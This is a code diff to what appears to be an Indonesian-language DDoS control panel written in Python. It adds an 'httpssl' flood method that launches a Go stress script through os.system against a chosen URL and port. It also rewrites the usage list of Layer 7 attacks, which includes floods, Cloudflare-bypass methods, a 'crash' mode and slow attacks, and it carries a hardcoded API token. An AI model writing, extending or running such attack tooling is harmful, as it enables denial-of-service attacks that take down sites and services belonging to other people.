@@ -111,6 +111,7 @@ def layer7():
     print("▶ auto          : Pemilihan metode serangan otomatis berdasarkan analisis target")
     print("▶ crash         : Upaya untuk merusak server target (misalnya, melalui permintaan yang salah format)")
     print("▶ httpflood     : Banjir HTTP dasar (tingkat tinggi, berbagai jenis permintaan)")
+    print("▶ httpssl     : Serangan yang menargetkan komunikasi terenkripsi menggunakan protokol HTTPS/SSL")
     print("▶ cf-socket     : Serangan berbasis soket tingkat rendah untuk target yang dilindungi Cloudflare")
     print("▶ cf-pro        : Teknik bypass Cloudflare yang lebih canggih atau 'profesional'")
     print("▶ hyper         : Serangan dengan laju permintaan yang sangat tinggi")
@@ -157,22 +158,23 @@ def usage():
     print("--------------------------------------------------")
 
     print("\n--- METODE LAYER 7 ---")
-    print("▶ httpbypass    : httpbypass target.com 60")
-    print("▶ cfgas         : cfgas terget.com 60")
-    print("▶ http-storm    : http-storm target.com 60")
-    print("▶ tls           : tls target.com 60")
-    print("▶ cf-bypass     : cf-bypass target.com 60")
-    print("▶ uambypass     : uambypass target.com 60")
-    print("▶ httpget       : httpget target.com 60")
-    print("▶ auto          : auto target.com 60")
-    print("▶ crash         : crash target.com GET")
-    print("▶ httpflood     : httpflood target.com 15000 get 60")
-    print("▶ cf-socket     : cf-socket target.com 60 100 100")
-    print("▶ cf-pro        : cf-pro target.com 60 100 100")
-    print("▶ hyper         : hyper target.com 60")
-    print("▶ slow          : slow target.com 60")
-    print("▶ https-spoof   : https-spoof target.com 60")
-    print("▶ http-requests : http-requests target.com 60")
+    print("▶ httpbypass    : httpbypass https://target.com 60")
+    print("▶ cfgas         : cfgas https://target.com 60")
+    print("▶ http-storm    : http-storm https://target.com 60")
+    print("▶ tls           : tls https://target.com 60")
+    print("▶ cf-bypass     : cf-bypass https://target.com 60")
+    print("▶ uambypass     : uambypass https://target.com 60")
+    print("▶ httpget       : httpget https://target.com 60")
+    print("▶ auto          : auto https://target.com 60")
+    print("▶ crash         : crash https://target.com GET")
+    print("▶ httpflood     : httpflood https://target.com 15000 get 60")
+    print("▶ httpssl     : httpssl https://target.com port 60")
+    print("▶ cf-socket     : cf-socket https://target.com 60 100 100")
+    print("▶ cf-pro        : cf-pro https://target.com 60 100 100")
+    print("▶ hyper         : hyper https://target.com 60")
+    print("▶ slow          : slow https://target.com 60")
+    print("▶ https-spoof   : https-spoof https://target.com 60")
+    print("▶ http-requests : http-requests https://target.com 60")
 
     print("\n--- METODE LAYER 4 ---")
     print("▶ udp          : udp 1.1.1.1 port")
@@ -654,7 +656,21 @@ def main():
                 print(result) 
             except IndexError:
                 print('Usage: https-spoof <url> <time> <threads>')
-                print('Example: https-spoof http://vailon.com 60 500')                
+                print('Example: https-spoof http://vailon.com 60 500')     
+                
+        elif "httpssl" in cnc:
+            try:
+                url = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]               
+                os.system(f'go run stress.go {url} {port} 3 100 {time} 100')
+                url = f"{url}"
+                token = "727e8c2fa5b07c"
+                result = get_url_info(url, token)
+                print(result) 
+            except IndexError:
+                print('Usage: httpssl <url> <port> <time>')
+                print('Example: httpssl https://lol.com 443 60')                             
         
         elif "slow" in cnc:
             try:
